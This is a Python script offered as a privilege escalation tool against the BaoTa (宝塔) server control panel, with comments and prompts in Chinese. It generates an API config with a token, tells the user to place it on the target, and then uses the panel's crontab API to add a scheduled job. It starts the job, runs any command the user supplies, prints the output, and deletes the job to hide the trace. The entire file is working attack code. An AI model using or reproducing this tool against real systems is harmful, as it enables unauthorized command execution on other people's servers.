import requests
import argparse
import hashlib
import json
import time
import cowsay


def md5(string):
    return hashlib.md5(string.encode()).hexdigest()


def get_random_string(length):
    from random import Random
    strings = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    char_len = len(chars) - 1
    random = Random()
    for i in range(length):
        strings += chars[random.randint(0, char_len)]
    return strings


def get_ip():
    return requests.get(url='https://ifconfig.me/ip').text


def generate_example_config():
    token = md5(get_random_string(10))
    payload = {
        'open': True,
        'token': token,
        'limit_addr': [get_ip()]
    }
    print(json.dumps(payload))
    print('请保存在目标C:\\BtSoft\\panel\\config\\api.json')
    print(f"Usage: python bt_panel_api.py -u [URL] -t {token} -c whoami")


def exploit(url, token, cmd):
    # api sk
    timestamp = int(time.time())
    token = md5(str(timestamp) + token)
    api_sk = {
        'request_token': (None, f'{token}'),
        'request_time': (None, f'{timestamp}'),
    }
    crontab_name = get_random_string(10)
    # Add a crontab
    payload = {
        'sType': (None, 'toShell'),
        'name': (None, f'{crontab_name}'),
        'type': (None, 'day'),
        'hour': (None, '1'),
        'minute': (None, '30'),
        'sBody': (None, f'{cmd}'),
        'sName': (None, ''),
        'save': (None, ''),
        'backupTo': (None, 'localhost'),
    }
    payload.update(api_sk)
    requests.post(url=f'{url}/crontab?action=AddCrontab', files=payload)

    # Get crontab list
    payload = {
        'page': (None, '1'),
        'search': (None, ''),
    }
    payload.update(api_sk)
    crontab = json.loads(requests.post(url=f'{url}/crontab?action=GetCrontab', files=payload).text)

    # Start crontab
    payload = {
        # 新添加的会在第一条
        'id': (None, f"{crontab[0]['id']}"),
    }
    payload.update(api_sk)
    requests.post(url=f'{url}/crontab?action=StartTask', files=payload)

    # Waiting for execution
    time.sleep(3)

    # Read the crontab log
    log = json.loads(requests.post(url=f'{url}/crontab?action=GetLogs', files=payload).text)
    print(log['msg'])

    # Delete crontab
    requests.post(url=f'{url}/crontab?action=DelCrontab', files=payload)


if __name__ == '__main__':
    cowsay.cow('BaoTa Panel Privilege escalation tool\nAuthor: https://github.com/Hzllaga')
    parser = argparse.ArgumentParser()
    parser.add_argument("-g", "--generate", action="store_true", help='生成一个api示例.')
    parser.add_argument("-u", "--url", help='宝塔地址.')
    parser.add_argument("-t", "--token", help='API token.')
    parser.add_argument("-c", "--command", help='要执行的命令.')
    args = parser.parse_args()
    if args.generate:
        generate_example_config()
    else:
        if (args.url is not None) & (args.token is not None) & (args.command is not None):
            exploit(url=args.url, token=args.token, cmd=args.command)
        else:
            print('缺少参数')
